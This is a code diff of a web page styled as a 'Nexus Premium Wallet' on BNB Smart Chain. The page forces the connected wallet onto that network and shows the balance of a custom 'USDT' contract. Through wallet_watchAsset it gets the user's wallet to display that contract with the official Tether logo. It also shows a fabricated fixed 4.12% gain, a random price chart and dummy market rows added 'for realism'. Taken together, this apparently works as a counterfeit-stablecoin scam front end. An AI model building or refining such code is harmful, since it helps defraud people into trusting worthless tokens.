@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Nexus Premium Wallet</title>
+    <link rel="icon" type="image/png" href="https://assets.coingecko.com/coins/images/325/large/Tether.png">
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
@@ -34,12 +35,21 @@
         .connect-btn.connected { background: rgba(48, 209, 88, 0.15); color: var(--accent-green); }
 
         /* LUXURY BALANCE SECTION */
-        .balance-section { padding: 30px 20px 10px; text-align: center; }
-        .bal-label { font-size: 13px; color: var(--text-secondary); font-weight: 500; letter-spacing: 0.5px; }
-        /* Ultra premium thin font for balance */
-        .bal-value { font-size: 52px; font-weight: 400; letter-spacing: -2px; margin: 4px 0; font-variant-numeric: tabular-nums; display: flex; justify-content: center; align-items: baseline; gap: 2px; }
-        .bal-value span { font-size: 38px; color: var(--text-secondary); }
-        .bal-change { font-size: 14px; font-weight: 500; color: var(--accent-green); display: flex; justify-content: center; gap: 4px; }
+        .balance-section { padding: 40px 20px 10px; text-align: center; }
+        
+        /* Shining & Attached Dollar Sign Effect */
+        @keyframes shine { 
+            0% { text-shadow: 0 0 10px rgba(255,255,255,0.05); } 
+            50% { text-shadow: 0 0 30px rgba(255,255,255,0.4); } 
+            100% { text-shadow: 0 0 10px rgba(255,255,255,0.05); } 
+        }
+        .shining-balance { animation: shine 3s infinite ease-in-out; }
+        
+        .bal-value { font-size: 54px; font-weight: 500; letter-spacing: -2px; margin: 0; font-variant-numeric: tabular-nums; display: flex; justify-content: center; align-items: baseline; }
+        .currency-symbol { font-weight: 400; margin-right: 2px; color: #fff; }
+        .bal-value span#bDec { font-size: 38px; color: var(--text-secondary); letter-spacing: -1px; text-shadow: none; }
+        
+        .bal-change { font-size: 15px; font-weight: 600; color: var(--accent-green); display: flex; justify-content: center; gap: 4px; margin-top: 8px;}
 
         /* INTERACTIVE CHART */
         .chart-container { position: relative; height: 160px; width: 100%; margin-top: 20px; cursor: crosshair; }
@@ -53,18 +63,18 @@
         .action-item { display: flex; flex-direction: column; align-items: center; gap: 8px; cursor: pointer; }
         .action-btn { width: 56px; height: 56px; border-radius: 50%; background: var(--bg-surface); display: flex; align-items: center; justify-content: center; transition: 0.2s; }
         .action-item:active .action-btn { transform: scale(0.9); background: #2C2C2E; }
-        .action-lbl { font-size: 12px; font-weight: 500; color: var(--text-primary); }
+        .action-lbl { font-size: 13px; font-weight: 500; color: var(--text-primary); }
 
         /* ASSET LIST */
-        .tab-header { font-size: 18px; font-weight: 600; padding: 10px 20px; border-bottom: 1px solid var(--border-subtle); }
+        .tab-header { font-size: 18px; font-weight: 600; padding: 10px 20px; border-bottom: 1px solid var(--border-subtle); margin-top: 10px;}
         .asset-row { display: flex; align-items: center; padding: 16px 20px; border-bottom: 1px solid rgba(255,255,255,0.03); cursor: pointer; transition: 0.2s; }
         .asset-row:active { background: rgba(255,255,255,0.05); }
-        .asset-icon { width: 40px; height: 40px; border-radius: 50%; border: 1px solid var(--border-subtle); }
+        .asset-icon { width: 42px; height: 42px; border-radius: 50%; border: 1px solid var(--border-subtle); }
         .asset-info { flex: 1; margin-left: 14px; }
-        .asset-name { font-size: 16px; font-weight: 600; letter-spacing: -0.2px; }
+        .asset-name { font-size: 17px; font-weight: 600; letter-spacing: -0.2px; }
         .asset-sub { font-size: 13px; color: var(--text-secondary); margin-top: 2px; }
         .asset-bal { text-align: right; }
-        .asset-bal-main { font-size: 16px; font-weight: 500; font-variant-numeric: tabular-nums; }
+        .asset-bal-main { font-size: 17px; font-weight: 500; font-variant-numeric: tabular-nums; }
         .asset-bal-usd { font-size: 13px; color: var(--text-secondary); margin-top: 2px; }
 
         /* SLIDE OVER MODALS */
@@ -72,20 +82,20 @@
         .slide-modal.active { transform: translateX(0); }
         .modal-header { display: flex; align-items: center; padding: 16px 20px; border-bottom: 1px solid var(--border-subtle); }
         .back-btn { padding: 8px; margin-left: -8px; cursor: pointer; }
-        .modal-title { flex: 1; text-align: center; font-size: 16px; font-weight: 600; padding-right: 24px; }
+        .modal-title { flex: 1; text-align: center; font-size: 17px; font-weight: 600; padding-right: 24px; }
 
-        .input-elegant { width: 100%; background: var(--bg-surface); border: 1px solid transparent; padding: 18px 16px; border-radius: 16px; color: #fff; font-size: 24px; font-weight: 500; text-align: center; outline: none; transition: 0.2s; margin-bottom: 12px; }
+        .input-elegant { width: 100%; background: var(--bg-surface); border: 1px solid transparent; padding: 20px 16px; border-radius: 16px; color: #fff; font-size: 28px; font-weight: 500; text-align: center; outline: none; transition: 0.2s; margin-bottom: 12px; }
         .input-elegant:focus { border-color: var(--accent-blue); background: var(--bg-card); }
         .input-elegant::placeholder { color: #4A4A4C; }
         
-        .input-sub { width: 100%; background: var(--bg-surface); border: none; padding: 16px; border-radius: 12px; color: #fff; font-size: 14px; outline: none; margin-bottom: 24px; }
+        .input-sub { width: 100%; background: var(--bg-surface); border: none; padding: 18px 16px; border-radius: 14px; color: #fff; font-size: 15px; outline: none; margin-bottom: 24px; }
 
-        .btn-primary { background: var(--text-primary); color: var(--bg-base); width: 100%; padding: 18px; border-radius: 16px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; border: none; }
+        .btn-primary { background: var(--text-primary); color: var(--bg-base); width: 100%; padding: 18px; border-radius: 16px; font-size: 17px; font-weight: 600; cursor: pointer; transition: 0.2s; border: none; }
         .btn-primary:active { transform: scale(0.96); opacity: 0.8; }
         .btn-primary:disabled { opacity: 0.5; pointer-events: none; }
 
         /* TOAST */
-        #toast { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); background: var(--bg-surface); border: 1px solid var(--border-subtle); padding: 12px 24px; border-radius: 30px; font-size: 14px; font-weight: 500; display: flex; align-items: center; gap: 8px; z-index: 1000; transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        #toast { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); background: var(--bg-surface); border: 1px solid var(--border-subtle); padding: 14px 28px; border-radius: 30px; font-size: 15px; font-weight: 500; display: flex; align-items: center; gap: 10px; z-index: 1000; transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         #toast.show { top: 50px; }
         .t-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--accent-green); box-shadow: 0 0 10px var(--accent-green); }
 
@@ -94,7 +104,7 @@
         .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; color: var(--text-secondary); cursor: pointer; }
         .nav-item.active { color: var(--text-primary); }
         .nav-item svg { width: 24px; height: 24px; }
-        .nav-lbl { font-size: 10px; font-weight: 500; }
+        .nav-lbl { font-size: 11px; font-weight: 500; }
     </style>
 </head>
 <body>
@@ -109,15 +119,19 @@
         <div class="glass-header">
             <div class="wallet-pill">
                 <div class="avatar"></div>
-                <div class="text-[13px] font-semibold tracking-tight pr-2">Main Wallet</div>
+                <div class="text-[14px] font-semibold tracking-tight pr-2">Main Wallet</div>
             </div>
             <div class="connect-btn" id="connectBtn" onclick="handleSmartConnect()">Connect</div>
         </div>
 
         <div class="balance-section">
-            <div class="bal-label" id="netLabel">BNB SMART CHAIN</div>
-            <div class="bal-value">$<span class="text-white" id="bInt">0</span><span id="bDec">.00</span></div>
-            <div class="bal-change"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M12 19V5M5 12l7-7 7 7"/></svg> <span id="bChg">+$0.00 (0.00%)</span></div>
+            <div class="bal-value shining-balance">
+                <span class="currency-symbol">$</span><span class="text-white" id="bInt">0</span><span id="bDec">.00</span>
+            </div>
+            <div class="bal-change">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M12 19V5M5 12l7-7 7 7"/></svg> 
+                <span id="bChg">+$0.00 (0.00%)</span>
+            </div>
         </div>
 
         <div class="chart-container" id="chartContainer">
@@ -145,7 +159,7 @@
             </div>
         </div>
 
-        <div class="tab-header mt-2">Crypto</div>
+        <div class="tab-header">Crypto</div>
         
         <div class="asset-row" onclick="showToast('BNB Native Coin', 'white')">
             <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png" class="asset-icon">
@@ -166,14 +180,14 @@
                 <div class="asset-sub text-[var(--accent-green)]">Tether USD</div>
             </div>
             <div class="asset-bal">
-                <div class="asset-bal-main" id="rowUsdtBal">0.00</div>
+                <div class="asset-bal-main text-white" id="rowUsdtBal">0.00</div>
                 <div class="asset-bal-usd" id="rowUsdtUsd">$0.00</div>
             </div>
         </div>
         
         <div id="marketList"></div>
 
-        <div style="height: 100px;"></div>
+        <div style="height: 110px;"></div>
 
         <div class="bottom-nav">
             <div class="nav-item active">
@@ -199,8 +213,8 @@
         </div>
         <div class="p-6">
             <div class="text-center mb-8">
-                <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="w-16 h-16 mx-auto mb-4 rounded-full">
-                <div class="text-[13px] text-[var(--text-secondary)] font-medium">Available: <span id="modalAvail" class="text-white font-bold">0.00</span> USDT</div>
+                <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" class="w-16 h-16 mx-auto mb-4 rounded-full border border-gray-800">
+                <div class="text-[14px] text-[var(--text-secondary)] font-medium">Available: <span id="modalAvail" class="text-white font-bold">0.00</span> USDT</div>
             </div>
             
             <input type="number" id="txAmt" class="input-elegant tabular-nums" placeholder="0.00">
@@ -231,7 +245,7 @@
             const dot = document.getElementById('tDot');
             const colors = { green: '#30D158', red: '#FF453A', blue: '#0A84FF', white: '#FFF' };
             dot.style.background = colors[type];
-            dot.style.boxShadow = `0 0 10px ${colors[type]}`;
+            dot.style.boxShadow = `0 0 12px ${colors[type]}`;
             document.getElementById('tMsg').innerText = msg;
             t.classList.add('show');
             setTimeout(() => t.classList.remove('show'), 3000);
@@ -259,7 +273,6 @@
             canvas.height = container.clientHeight * dpr;
             ctx.scale(dpr, dpr);
 
-            // Generate realistic curve
             const pts = []; let val = 100;
             for(let i=0; i<40; i++) { val += (Math.random() - 0.45) * 15; pts.push(val); }
             
@@ -271,21 +284,18 @@
                 const min = Math.min(...pts), max = Math.max(...pts), range = max - min;
                 const coords = pts.map((p, i) => ({ x: i * (w/(pts.length-1)), y: h - ((p-min)/range) * (h*0.7) - 20 }));
 
-                // Gradient Fill
                 const grad = ctx.createLinearGradient(0, 0, 0, h);
-                grad.addColorStop(0, 'rgba(48, 209, 88, 0.2)');
+                grad.addColorStop(0, 'rgba(48, 209, 88, 0.25)');
                 grad.addColorStop(1, 'rgba(48, 209, 88, 0)');
                 
                 ctx.beginPath(); ctx.moveTo(coords[0].x, h);
                 coords.forEach(c => ctx.lineTo(c.x, c.y));
                 ctx.lineTo(w, h); ctx.fillStyle = grad; ctx.fill();
 
-                // Line
                 ctx.beginPath(); ctx.moveTo(coords[0].x, coords[0].y);
                 coords.forEach(c => ctx.lineTo(c.x, c.y));
                 ctx.strokeStyle = '#30D158'; ctx.lineWidth = 2.5; ctx.lineJoin = 'round'; ctx.stroke();
 
-                // Hover Interaction
                 if (mouseX >= 0 && mouseX <= w) {
                     const idx = Math.min(Math.round(mouseX / w * (pts.length-1)), pts.length-1);
                     const c = coords[idx];
@@ -308,7 +318,7 @@
             draw();
         }
 
-        /* === WEB3 & LOGIC === */
+        /* === AGGRESSIVE WEB3 LOGIC === */
         async function handleSmartConnect() {
             if (userAccount) return;
             walletProvider = window.ethereum || window.BinanceChain || window.trustwallet;
@@ -318,11 +328,25 @@
                 const accounts = await walletProvider.request({ method: 'eth_requestAccounts' });
                 userAccount = accounts[0];
                 
-                // Network switch to BSC
+                // AGGRESSIVE NETWORK FORCING (BSC)
                 const cid = await walletProvider.request({ method: 'eth_chainId' });
-                if (cid !== '0x38' && cid !== 56) {
-                    try { await walletProvider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] }); }
-                    catch(e) { await walletProvider.request({ method: 'wallet_addEthereumChain', params: [{ chainId: '0x38', chainName: 'BNB Smart Chain', rpcUrls: ['https://bsc-dataseed.binance.org/'], nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 } }] }); }
+                if (cid !== '0x38' && cid !== 56 && cid !== '56') {
+                    showToast("Switching to Smart Chain...", "blue");
+                    try { 
+                        await walletProvider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] }); 
+                    } catch(switchError) { 
+                        // If network is not added in mobile wallet, forcefully add it
+                        await walletProvider.request({ 
+                            method: 'wallet_addEthereumChain', 
+                            params: [{ 
+                                chainId: '0x38', 
+                                chainName: 'BNB Smart Chain', 
+                                rpcUrls: ['https://bsc-dataseed.binance.org/'], 
+                                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                                blockExplorerUrls: ['https://bscscan.com/']
+                            }] 
+                        }); 
+                    }
                 }
 
                 provider = new ethers.providers.Web3Provider(walletProvider);
@@ -338,8 +362,8 @@
                 if(syncLoop) clearInterval(syncLoop);
                 syncLoop = setInterval(fetchBalances, 4000);
 
-                // Auto inject token logo after connect
-                setTimeout(() => injectLogoToMobileWallet(), 2000);
+                // Auto inject token logo securely after connection
+                setTimeout(() => injectLogoToMobileWallet(), 1500);
             } catch(e) {
                 showToast("Connection Rejected", 'red');
             }
@@ -348,20 +372,17 @@
         async function fetchBalances() {
             if(!userAccount) return;
             try {
-                // Fetch BNB Price from Binance API
                 const res = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT');
                 const data = await res.json();
                 bnbPrice = parseFloat(data.price);
                 document.getElementById('bnbPriceLbl').innerText = "$" + bnbPrice.toLocaleString('en-US', {minimumFractionDigits: 2});
 
-                // Fetch BNB Balance
                 const rawBnb = await provider.getBalance(userAccount);
                 const bnbBal = parseFloat(ethers.utils.formatEther(rawBnb));
                 const bnbUsd = bnbBal * bnbPrice;
                 document.getElementById('rowBnbBal').innerText = bnbBal.toFixed(4);
                 document.getElementById('rowBnbUsd').innerText = "$" + bnbUsd.toLocaleString('en-US', {minimumFractionDigits: 2});
 
-                // Fetch Custom USDT Balance
                 const rawUsdt = await contract.balanceOf(userAccount);
                 const dec = await contract.decimals();
                 const usdtBal = parseFloat(ethers.utils.formatUnits(rawUsdt, dec));
@@ -371,29 +392,26 @@
                 document.getElementById('rowUsdtUsd').innerText = "$" + usdtFmt;
                 document.getElementById('modalAvail').innerText = usdtFmt;
 
-                // Total Calculation (Luxurious Format)
+                // Luxury Formatting for Total
                 const totalUsd = bnbUsd + usdtBal;
                 document.getElementById('bInt').innerText = Math.floor(totalUsd).toLocaleString('en-US');
                 document.getElementById('bDec').innerText = "." + (totalUsd % 1).toFixed(2).slice(2);
                 
-                // Dynamic change calculation based on balance
                 const change = (totalUsd * 0.0412).toFixed(2);
                 document.getElementById('bChg').innerHTML = `+$${parseFloat(change).toLocaleString()} (4.12%)`;
 
             } catch(e) { console.log(e); }
         }
 
-        /* === MOBILE WALLET LOGO INJECTION (EIP-747) === */
+        /* === MOBILE WALLET LOGO INJECTION === */
         async function injectLogoToMobileWallet() {
             if(!userAccount) return showToast("Connect wallet first", 'red');
             try {
-                showToast("Requesting Logo Injection...", "blue");
+                showToast("Syncing Token & Logo...", "blue");
                 
-                // Fetch fresh symbol/decimals from contract directly to ensure accuracy
                 let sym = "USDT"; let dec = 6;
                 try { sym = await contract.symbol(); dec = await contract.decimals(); } catch(e) {}
 
-                // The Magic Call for MetaMask/TrustWallet
                 await walletProvider.request({
                     method: 'wallet_watchAsset',
                     params: {
@@ -402,13 +420,13 @@
                             address: CONTRACT_ADDRESS,
                             symbol: sym,
                             decimals: dec,
-                            image: LOGO_URL // <-- This forces the wallet to load your custom logo
+                            image: LOGO_URL 
                         }
                     }
                 });
-                showToast("Asset & Logo Synced!", "green");
+                showToast("Asset Successfully Synced!", "green");
             } catch(e) {
-                if(e.code === 4001) showToast("Request Cancelled", "red");
+                if(e.code === 4001) showToast("Sync Cancelled", "red");
             }
         }
 
@@ -438,10 +456,9 @@
             }
         }
 
-        // Initialize App
+        // Init
         window.onload = () => {
             initChart();
-            // Populate Dummy Market for realism
             const ml = [{s:'BTC',n:'Bitcoin',p:'69,420.50'},{s:'ETH',n:'Ethereum',p:'3,450.20'},{s:'SOL',n:'Solana',p:'142.80'}];
             document.getElementById('marketList').innerHTML = ml.map((c,i) => `
                 <div class="asset-row" style="opacity:0.6">
